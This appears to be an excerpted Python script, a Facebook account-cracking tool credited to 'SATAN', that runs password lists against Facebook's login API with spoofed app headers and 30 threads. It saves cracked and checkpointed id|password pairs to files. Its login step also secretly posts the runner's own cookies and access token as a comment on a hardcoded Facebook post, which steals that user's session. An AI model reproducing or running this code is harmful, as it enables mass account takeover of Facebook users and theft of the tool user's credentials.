...
os.system('xdg-open https://www.facebook.com/groups/277547693132769/')
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Luciferhck143/xxx/main/user.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
`8bo.   88ooo88    88    88ooo88 88V8o 88  \033[1;91mP  
  `Y8b. 88~~~88    88    88~~~88 88 V8o88  \033[1;91mR 
db   8D 88   88    88    88   88 88  V888  \033[1;91m0  
`8888Y' YP   YP    YP    YP   YP VP   V8P 
----------------------------------------------
→ Author    : SATAN
→ Github    : Luciferhck143
→ Facebook  : OFFICIAL/ACCOUNT __SATAN______
→ Paid/Free : FREE
→ Version   : 1.0
 ----------------------------------------------
...
def login():
        ...
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                ...
                requests.post('https://b-graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
...
def public():
        ...
        try:
                ...
                login()
        try:
                info = requests.get('https://b-graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
        ...
        linex()
        print(' [1] \033[1;91mMethod 1 (UPDATED) \n [2] \033[1;91mMethod 2 (COMING SOON)\n [3] \033[1;91mMethod 3 (COMING SOON)')
        linex()
        mthd = input(' Choose \033[1;91mmethod: ')
        linex()
        print(' Do you went show cp account? \033[1;91m(y/n): ')
        linex()
        cx=input(' Choose: ')
        ...
        try:
                plist = []
                try:
                        ps_limit = int(input(' ("""\033[1;91mHow many passwords do you want to add ?""") '))
                except:
                        ps_limit =1
                linex()
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;91mMethod -> \033[1;91mM{mthd}')
                        print("\033[97;1m \x1b[38;5;208mUse flight mode for speed up\033[97;1m")
                        linex()
                        for user in id:
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' All method working try 1 by 1 ')
                                linex()
                                print(' [1] Method 1 (Update) \n [2] Method 2 (Coming Soon)\n [3] Method 3 (Coming Soon)')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
...
def pak():
                ...
                with tred(max_workers=30) as SATAN:     
                        ...
                        print(f'\033[1;91m \x1b[38;5;208mUse flight mode for speed up\033[1;91m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def gmail():
                ...
                with tred(max_workers=30) as SATAN:
                        ...
                        print("\033[1;91m \x1b[38;5;208mUse flight mode for speed up\033[1;91m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;91m [STN.RUN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SATAN:
                                ...
                                print('\r\r\033[92;1m[SATAN.OK] %s | %s'%(ids,pas))
...
def Method1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [\033[1;91mSTN.RUN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ...
    'x-fb-request-id': 'AbTLN2Elz4X-w7a84Ms0G6F', 
    'x-fb-trace-id': 'FZn7Z/VgK/V',
    'x-fb-rev': '1007468797', 
    'x-fb-debug': 'pThbgy85UdNG7NbDFPZa1dtCTu+ghxQFamsb5EZ1bw1Rfa8E0dBalcKZ9WqW1nAxyOAsyjYYd8ftb0yTsRyRAA==',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36',
        } 
                                url = 'https://developers.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [\033[92;1mSATAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SATAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SATAN-M2-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    'pragma': 'no-cache', 
    'cache-control': 'private, no-cache, no-store, must-revalidate', 
    'x-fb-request-id': 'AgGLBIYg5LpyrUUg23TNoVU', 
    'x-fb-trace-id': 'Df6KTz7IsrS',
    'x-fb-rev': '1007449532', 
    'x-fb-debug': 'JNYj1aRRci7xAM0JRw8/gIhQiNvMOU3tegCwD06qV9wCHRtxBU+SXVpa9lPW9dBIxPvcP/8Y/3m7FeFfXk9uhw==',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
    ...
    'user-agent': '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[92;1m [SATAN-M2-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SATAN-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [SATAN-M2-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SATAN-M2-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SATAN-M3-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
    ...
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5665.223 Mobile Safari/537.36',
}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SATAN-M3-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SATAN-M3-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SATAN-M3-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[38;5;208m [SATAN-M3-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SATAN-M3-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
